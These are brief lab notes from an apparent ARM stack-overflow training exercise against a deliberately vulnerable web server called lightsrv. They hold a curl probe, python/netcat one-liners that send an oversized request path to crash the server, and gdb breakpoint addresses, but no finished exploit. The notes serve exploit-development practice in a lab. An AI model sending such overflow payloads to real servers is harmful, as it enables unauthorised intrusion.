Exploiting lightsrv HTTP server
--------------------------------

================================================================== CURL ============================================================================
> curl -vv 192.168.100.2
*   Trying 192.168.100.2:80...
* Connected to 192.168.100.2 (192.168.100.2) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.100.2
> User-Agent: curl/7.77.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: EXPLOITLAB ROP WARM-UP/2.0
< Content-Length: 1056
< Content-Type: text/html
< 
<html>
<head>
<link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
<h1>The ARM Exploit Laboratory</h1>
<h2>ARM STACK OVERFLOW WARM-UP EXERCISE</h2>
<p>
This is a warm-up exercise for exploiting stack overflows. The underlying web server is vulnerable to a stack overflow. Your task is to identify 
the input that triggers this vulnerability and write a working exploit for it.
</p>
<p>
Follow the methodology, and get a shell!
<ul>
<li>Identify the vulnerable HTTP request.
<li>Analyze the crash.
<li>Is it a stack overflow? Check registers, stack memory.
<li>Determine the offset to the Program Counter (PC).
<li>Determine the position of the stack pointer relative to the beginning of the payload.
<li>Overwrite PC precisely.
<li>Plan the payload. Where shall you place the shellcode?
<li>Search for a suitable Jump-through-Register instruction in the binary or shared libraries.
<li>Inject and return to "test shellcode" (BKPT).
<li>Prepare a final working exploit.
</ul>
</p>

<H1><a href="basic.html">START &gt&gt</a></H1>
</html>


==================================================== Crafting malicious HTTP request ====================================================================

Trying with well-formed legitimate HTTP request : 
python -c "print 'GET /' + 'HTTP/1.1\r\n' + 'Host:192.168.100.2\r\n'  'User-Agent:netcat\r\n' 'Accept:*/*\r\n\r\n'  " | nc 192.168.100.2 8080

Crafting malicious HTTP request : 
python -c "print 'GET /' + 'A'*512 + 'HTTP/1.1\r\n' + 'Host:192.168.100.2\r\n'  'User-Agent:netcat\r\n' 'Accept:*/*\r\n\r\n'  " | nc 192.168.100.2 8080

python -c "print 'GET /' + 'A'*512 + 'HTTP/1.1\r\n' + 'Host:BBBBBB\r\n\r\n' " | nc 192.168.100.2 8080





breakpoints in handle_single_request :

break *0x00011138
break *0x00011158
break *0x00011184
break *0x00011234
break *0x00011258
break *0x00011198

break *0x00011138 *0x00011158 *0x00011184 *0x00011234 *0x00011258 *0x00011198
